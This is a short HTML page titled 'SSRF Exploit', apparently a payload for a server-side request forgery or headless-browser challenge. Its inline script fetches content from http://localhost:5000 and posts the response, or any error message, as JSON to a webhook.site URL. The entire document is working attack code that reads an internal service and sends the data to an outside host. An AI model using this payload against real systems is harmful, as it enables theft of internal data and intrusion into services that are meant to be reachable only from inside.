<!DOCTYPE html>
<html>
<head>
    <title>SSRF Exploit</title>
    <script>
        // Fetch content from localhost:5000
        fetch('http://localhost:5000')
            .then(response => response.text()) // Convert response to text
            .then(data => {
                // Send the data to your webhook
                fetch('https://webhook.site/9faca373-e052-47e8-b1e2-4356a2db2f2e', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ response: data })
                });
            })
            .catch(error => {
                // Send error message to webhook
                fetch('https://webhook.site/9faca373-e052-47e8-b1e2-4356a2db2f2e', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ error: error.message })
                });
            });
    </script>
</head>
<body>
    <p>Fetching localhost:5000...</p>
</body>
</html>
